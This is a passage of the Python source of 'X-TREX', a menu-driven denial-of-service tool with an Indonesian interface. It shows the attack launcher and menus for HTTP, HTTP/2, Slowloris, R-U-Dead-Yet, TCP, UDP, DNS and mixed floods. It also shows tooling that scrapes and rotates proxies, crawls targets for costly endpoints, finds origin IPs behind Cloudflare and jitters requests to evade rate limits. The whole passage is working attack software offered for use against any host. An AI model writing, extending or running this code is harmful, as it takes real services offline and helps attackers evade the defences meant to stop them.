    print(f"  {C.D}target   {C.R}{C.G}{cfg['host']}:{cfg['port']}  tls={cfg['tls']}")
    print(f"  {C.D}thread   {C.R}{cfg['threads']}")
    print(f"  {C.D}durasi   {C.R}{cfg['duration']}s")
    print(f"  {C.D}proxy    {C.R}{len(proxies)} aktif")
    print(f"  {C.D}endpoint {C.R}{len(endpoints)} pool")
    print(f"  {C.D}stealth  {C.R}{cfg.get('stealth', False)}")
    print(f"  {C.D}{'─'*54}{C.R}\n")

    stats.reset()
    stats.start_print()

    for _ in range(cfg["threads"]):
        pick_worker(metode, ctx).start()

    t0 = time.time()
    try:
        if cfg["duration"] > 0:
            time.sleep(cfg["duration"])
        else:
            while True:
                time.sleep(1)
    except KeyboardInterrupt:
        print()
    stop.set()
    stats.stop_print()
    time.sleep(0.8)

    snap = stats.snap()
    elapsed = time.time() - t0
    print(f"\n  {C.G}■  selesai.{C.R}  paket {snap['p']}  byte {snap['b']}  "
          f"ok {snap['o']}  fail {snap['f']}  durasi {elapsed:.0f}s")
    if snap["e"]:
        for e in snap["e"][-3:]:
            print(f"  {C.Rd}· {e}{C.R}")
    log_session(
        f"{time.strftime('%H:%M:%S')} | {metode:<5} | {cfg['host']}:{cfg['port']} "
        f"| prox={len(proxies)} ep={len(endpoints)} th={cfg['threads']} "
        f"| pkt={snap['p']} ok={snap['o']} fail={snap['f']} dur={elapsed:.0f}s"
    )
    input(f"\n  {C.D}enter untuk kembali…{C.R}")

# ═══════════════════════════════════════════════════════════════════
# UI HELPERS
# ═══════════════════════════════════════════════════════════════════
def banner(sub="menu utama"):
    cls()
    print(C.Cy + C.B + r"""
   ██╗  ██╗       ████████╗██████╗ ███████╗██╗  ██╗
   ╚██╗██╔╝       ╚══██╔══╝██╔══██╗██╔════╝╚██╗██╔╝
    ╚███╔╝   ███╗   ██║   ██████╔╝█████╗   ╚███╔╝
    ██╔██╗   ╚══╝   ██║   ██╔══██╗██╔══╝   ██╔██╗
   ██╔╝ ██╗         ██║   ██║  ██║███████╗██╔╝ ██╗
   ╚═╝  ╚═╝         ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝""" + C.R)
    print(C.Mg + f"           x-trex v1.1 · {sub}" + C.R)
    print(C.D  + "           " + "─" * 46 + C.R)


def info(k, v):
    print(f"  {C.D}{k:<12}{C.R} {C.G}{v}{C.R}")


def ask(text, default=""):
    try:
        if default != "" and default is not None:
            v = input(f"  {C.Y}{text}{C.R} {C.D}[{default}]{C.R}: ").strip()
            return v if v else str(default)
        return input(f"  {C.Y}{text}{C.R}: ").strip()
    except (EOFError, KeyboardInterrupt):
        return str(default) if default != "" else ""


def ask_int(text, default):
    v = ask(text, default)
    try:
        return int(v)
    except Exception:
        return default


def ask_bool(text, default=False):
    d = "y" if default else "n"
    v = ask(f"{text} y/n", d).lower()
    return v in ("y", "ya", "yes", "1", "true")

# ═══════════════════════════════════════════════════════════════════
# MENU VEKTOR
# ═══════════════════════════════════════════════════════════════════
VEKTOR = [
    ("1", "http",  "HTTP/1.1 Flood",     "GET/POST/HEAD · proxy + endpoint rotasi"),
    ("2", "h2",    "HTTP/2 Multiplex",   "ALPN h2 · 15-40 stream per koneksi"),
    ("3", "slow",  "Slowloris",          "header paruh · worker pool exhaust"),
    ("4", "ruddy", "R-U-Dead-Yet",       "slow POST body · connection exhaust"),
    ("5", "tcp",   "TCP Connect Flood",  "3-way handshake terus-menerus"),
    ("6", "udp",   "UDP Flood",          "payload acak ukuran custom"),
    ("7", "dns",   "DNS Query Flood",    "label acak · A/ANY"),
    ("8", "mixed", "Mixed Multi-Vector", "acak semua vektor"),
]
VMAP = {k: m for k, m, _, _ in VEKTOR}
VLABEL = {m: label for _, m, label, _ in VEKTOR}


def sub_vektor(sess, kode):
    metode = VMAP[kode]
    label = VLABEL[metode]
    cfg = sess["cfg"]

    banner(f"vektor · {label}")
    print()
    info("vektor", metode)
    print(f"  {C.D}{'─'*46}{C.R}\n")

    if cfg["host"]:
        url = ask("URL / host target (kosong = pakai tersimpan)", cfg["host"])
    else:
        url = ask("URL / host target", "")

    if not url:
        print(f"  {C.Rd}[!] target kosong{C.R}")
        input(f"  {C.D}enter…{C.R}"); return

    h, port, tls, path = parse_url(url)
    if metode == "dns":
        port = 53
    if metode == "h2" and port == 80:
        port = 443; tls = True
    cfg["host"] = h
    cfg["port"] = port
    cfg["tls"] = tls
    cfg["path"] = path

    cfg["threads"] = ask_int("threads", cfg["threads"])
    cfg["duration"] = ask_int("durasi detik (0=∞)", cfg["duration"])
    cfg["use_proxies"] = ask_bool("pakai proxy auto-scrape", cfg.get("use_proxies", True))
    cfg["use_endpoints"] = ask_bool("pakai endpoint hunter pool", cfg.get("use_endpoints", True))
    if metode in ("http", "h2", "slow", "ruddy"):
        cfg["stealth"] = ask_bool("stealth jitter (rate-limit evade)", cfg.get("stealth", False))
    save_cfg()

    banner(f"konfirmasi · {label}")
    print()
    info("vektor", metode)
    info("target", f"{cfg['host']}:{cfg['port']}")
    info("tls", cfg["tls"])
    info("path", cfg["path"])
    info("threads", cfg["threads"])
    info("durasi", f"{cfg['duration']}s{' (∞)' if cfg['duration'] == 0 else ''}")
    info("proxy", "auto" if cfg["use_proxies"] else "off")
    info("endpoint", "auto" if cfg["use_endpoints"] else "off")
    info("stealth", cfg["stealth"])
    print()
    print(f"  {C.G}[1]{C.R} Lanjut — mulai serang")
    print(f"  {C.Rd}[2]{C.R} Batal  — kembali ke menu")
    print()
    p = input(f"{C.G}  pilih> {C.R}").strip().lower()
    if p in ("1", "l", "lanjut", "y", "ya"):
        fire(sess, metode)

# ═══════════════════════════════════════════════════════════════════
# MENU SETTINGS
# ═══════════════════════════════════════════════════════════════════
PROFILES = {
    "light":   {"threads": 30,  "duration": 60,  "stealth": False},
    "medium":  {"threads": 80,  "duration": 120, "stealth": False},
    "heavy":   {"threads": 150, "duration": 300, "stealth": False},
    "stealth": {"threads": 40,  "duration": 240, "stealth": True},
}


def menu_settings(sess):
    cfg = sess["cfg"]
    while True:
        banner("settings")
        print()
        info("threads", cfg["threads"])
        info("duration", cfg["duration"])
        info("stealth", cfg.get("stealth"))
        info("stealth_ms", f"{cfg.get('stealth_min_ms')}-{cfg.get('stealth_max_ms')}")
        info("udp_size", cfg.get("udp_size"))
        info("payload_mode", cfg.get("payload_mode"))
        info("use_proxies", cfg.get("use_proxies"))
        info("use_endpoints", cfg.get("use_endpoints"))
        info("profile", cfg.get("profile"))
        print()
        print(f"  {C.G}[1]{C.R} threads     {C.G}[2]{C.R} duration    {C.G}[3]{C.R} stealth toggle")
        print(f"  {C.G}[4]{C.R} stealth_ms  {C.G}[5]{C.R} udp_size    {C.G}[6]{C.R} payload_mode")
        print(f"  {C.G}[7]{C.R} proxies     {C.G}[8]{C.R} endpoints")
        print(f"  {C.Mg}[p]{C.R} profil preset   {C.Rd}[0]{C.R} kembali")
        print()
        p = input(f"{C.G}  pilih> {C.R}").strip().lower()
        if p in ("0", ""): return
        if p == "1": cfg["threads"] = ask_int("threads", cfg["threads"])
        elif p == "2": cfg["duration"] = ask_int("duration detik", cfg["duration"])
        elif p == "3": cfg["stealth"] = ask_bool("stealth", cfg.get("stealth", False))
        elif p == "4":
            cfg["stealth_min_ms"] = ask_int("min ms", cfg.get("stealth_min_ms", 20))
            cfg["stealth_max_ms"] = ask_int("max ms", cfg.get("stealth_max_ms", 200))
        elif p == "5": cfg["udp_size"] = ask_int("udp payload byte", cfg.get("udp_size", 1200))
        elif p == "6": cfg["payload_mode"] = ask("payload (rand/json/form)", cfg.get("payload_mode", "rand"))
        elif p == "7": cfg["use_proxies"] = ask_bool("use proxies", cfg.get("use_proxies", True))
        elif p == "8": cfg["use_endpoints"] = ask_bool("use endpoints", cfg.get("use_endpoints", True))
        elif p == "p":
            print(f"\n  preset: {', '.join(PROFILES.keys())}")
            name = ask("nama preset", "medium")
            if name in PROFILES:
                for k, v in PROFILES[name].items():
                    cfg[k] = v
                cfg["profile"] = name
        save_cfg()

# ═══════════════════════════════════════════════════════════════════
# MENU PROXY
# ═══════════════════════════════════════════════════════════════════
def menu_proxy(sess):
    banner("proxy manager")
    print()
    cached = load_proxies_cached()
    info("cache file", PROXY_CACHE if os.path.exists(PROXY_CACHE) else "(kosong)")
    info("cache jumlah", len(cached))
    info("auto-load", "on" if sess["cfg"].get("use_proxies") else "off")
    print()
    print(f"  {C.G}[1]{C.R} Re-scrape + health check (overwrite cache)")
    print(f"  {C.G}[2]{C.R} Health-check cache saja")
    print(f"  {C.G}[3]{C.R} Toggle auto-load saat flood")
    print(f"  {C.Rd}[0]{C.R} kembali")
    print()
    p = input(f"{C.G}  pilih> {C.R}").strip()
    if p == "1":
        print()
        live = get_proxies(force_refresh=True, verbose=True)
        print(f"\n  {C.G}»  {len(live)} proxy hidup disimpan ke {PROXY_CACHE}{C.R}")
    elif p == "2":
        if not cached:
            print(f"  {C.Y}[!] cache kosong — scrape dulu{C.R}")
        else:
            print()
            live = check_proxies_parallel(cached, verbose=True)
            save_proxies(live)
            print(f"\n  {C.G}»  {len(live)}/{len(cached)} hidup disimpan{C.R}")
    elif p == "3":
        sess["cfg"]["use_proxies"] = not sess["cfg"].get("use_proxies", True)
        save_cfg()
        print(f"  {C.G}»  auto-load: {sess['cfg']['use_proxies']}{C.R}")
    else:
        return
    input(f"\n  {C.D}enter…{C.R}")

# ═══════════════════════════════════════════════════════════════════
# MENU ENDPOINT
# ═══════════════════════════════════════════════════════════════════
def menu_endpoint(sess):
    banner("endpoint hunter")
    print()
    cfg = sess["cfg"]
    if not cfg["host"]:
        print(f"  {C.Rd}[!] target kosong — set dari menu vektor dulu{C.R}")
        input(f"  {C.D}enter…{C.R}"); return
    info("target", cfg["host"])
    info("tls", cfg["tls"])
    info("file", ENDPOINT_FILE if os.path.exists(ENDPOINT_FILE) else "(kosong)")
    print()
    print(f"  {C.G}[1]{C.R} Hunt endpoint sekarang")
    print(f"  {C.G}[2]{C.R} Toggle auto-load saat flood")
    print(f"  {C.G}[3]{C.R} Lihat top endpoint dari cache")
    print(f"  {C.Rd}[0]{C.R} kembali")
    print()
    p = input(f"{C.G}  pilih> {C.R}").strip()
    if p == "1":
        print()
        max_pages = ask_int("max halaman crawl", 25)
        hasil = hunt_endpoints(cfg["host"], cfg["tls"], verbose=True, max_pages=max_pages)
        if not hasil:
            print(f"  {C.Y}[!] tidak ada endpoint — target mungkin blok crawler{C.R}")
        else:
            save_endpoints(cfg["host"], hasil)
            print(f"\n  {C.Cy}top 15 endpoint mahal:{C.R}\n")
            for i, (p_, sc) in enumerate(hasil[:15], 1):
                warna = C.Rd if sc >= 10 else (C.Y if sc >= 6 else C.G)
                print(f"  {i:<3} {warna}{sc:<5}{C.R} {p_[:65]}")
            print(f"\n  {C.G}»  tersimpan: {ENDPOINT_FILE}{C.R}")
    elif p == "2":
        cfg["use_endpoints"] = not cfg.get("use_endpoints", True)
        save_cfg()
        print(f"  {C.G}»  auto-load: {cfg['use_endpoints']}{C.R}")
    elif p == "3":
        eps = load_endpoints(top=None)
        if not eps:
            print(f"  {C.Y}[!] belum ada endpoint{C.R}")
        else:
            for i, p_ in enumerate(eps[:30], 1):
                print(f"  {i:<3} {p_}")
    else:
        return
    input(f"\n  {C.D}enter…{C.R}")

# ═══════════════════════════════════════════════════════════════════
# MENU ORIGIN
# ═══════════════════════════════════════════════════════════════════
def menu_origin(sess):
    banner("origin IP finder")
    print()
    cfg = sess["cfg"]
    host = ask("domain target", cfg.get("host") or "")
    if not host:
        return
    print()
    non_cf, cf = find_origin(host, verbose=True)
    print()
    if non_cf:
        print(f"  {C.G}host non-Cloudflare (kandidat origin asli):{C.R}")
        items = list(non_cf.items())
        for h_, ips_ in items:
            print(f"    {C.Cy}{h_:<40}{C.R} → {', '.join(ips_)}")
        if ask_bool("set salah satu sebagai target flood", False):
            pick = ask("host kandidat", items[0][0])
            if pick in non_cf:
                cfg["host"] = pick
                save_cfg()
                print(f"  {C.G}»  target sekarang: {pick}{C.R}")
    else:
        print(f"  {C.Y}[!] tidak ada host non-CF — origin mungkin di-hide{C.R}")
    if cf:
        print(f"\n  {C.D}via Cloudflare: {', '.join(list(cf.keys())[:8])}{C.R}")
    input(f"\n  {C.D}enter…{C.R}")

# ═══════════════════════════════════════════════════════════════════
# MENU INFO
# ═══════════════════════════════════════════════════════════════════
def menu_info(sess):
    banner("info")
    print()
    for k, v in sess["cfg"].items():
        info(k, v)
    print()
    info("config_file", CFG_FILE)
    info("proxy_cache", PROXY_CACHE if os.path.exists(PROXY_CACHE) else "-")
    info("endpoint_file", ENDPOINT_FILE if os.path.exists(ENDPOINT_FILE) else "-")
    info("log_dir", LOG_DIR)
    input(f"\n  {C.D}enter…{C.R}")

# ═══════════════════════════════════════════════════════════════════
# MENU UTAMA
# ═══════════════════════════════════════════════════════════════════
def menu_utama(sess):
    banner()
    cfg = sess["cfg"]
    print()
    if cfg["host"]:
        print(f"  {C.D}target  {C.R}{C.G}{cfg['host']}{C.R}{C.D}:{cfg['port']}  "
              f"thread {cfg['threads']}  durasi {cfg['duration']}s{C.R}\n")
    else:
        print(f"  {C.D}belum ada target — pilih vektor untuk isi URL{C.R}\n")

    print(f"  {C.Cy}╭─ VEKTOR ─────────────────────────────────────────╮{C.R}")
    for k, m, label, desc in VEKTOR:
        print(f"  {C.Cy}│{C.R} {C.G}[{k}]{C.R} {label:<22}{C.D}{desc}{C.R}")
    print(f"  {C.Cy}╰──────────────────────────────────────────────────╯{C.R}")
    print()
    print(f"  {C.Cy}╭─ TOOLS ──────────────────────────────────────────╮{C.R}")
    print(f"  {C.Cy}│{C.R} {C.Mg}[x]{C.R} Proxy Manager   {C.D}scrape + health-check + cache{C.R}")
    print(f"  {C.Cy}│{C.R} {C.Mg}[e]{C.R} Endpoint Hunter {C.D}crawl + skor endpoint mahal{C.R}")
    print(f"  {C.Cy}│{C.R} {C.Mg}[o]{C.R} Origin Finder   {C.D}cari IP asli di balik CF{C.R}")
    print(f"  {C.Cy}│{C.R} {C.Mg}[s]{C.R} Settings        {C.D}thread/durasi/stealth/payload{C.R}")
    print(f"  {C.Cy}│{C.R} {C.Mg}[i]{C.R} Info            {C.D}config aktif + paths{C.R}")
    print(f"  {C.Cy}│{C.R} {C.Rd}[q]{C.R} Keluar{C.R}")
    print(f"  {C.Cy}╰──────────────────────────────────────────────────╯{C.R}")
    print()

# ═══════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════
def main():
    load_cfg()
    sess = {"cfg": CFG}
    try:
        while True:
            menu_utama(sess)
            p = input(f"{C.G}  xtrex ▸ {C.R}").strip().lower()
            if p in ("q", "quit", "exit", "0"):
                break
            if p in VMAP:
                sub_vektor(sess, p); continue
            if p in ("x", "proxy"):
                menu_proxy(sess); continue
            if p in ("e", "endpoint"):
                menu_endpoint(sess); continue
            if p in ("o", "origin"):
                menu_origin(sess); continue
            if p in ("s", "settings"):
                menu_settings(sess); continue
            if p in ("i", "info"):
                menu_info(sess); continue
            if not p:
                continue
            print(f"  {C.Rd}[!] tidak dikenal: {p}{C.R}")
            time.sleep(0.6)
    except KeyboardInterrupt:
        pass
    cls()
    print(C.Cy + "\n  X-TREX keluar. config → xtrex.json, log → xtrex-logs/\n" + C.R)


if __name__ == "__main__":
    main()
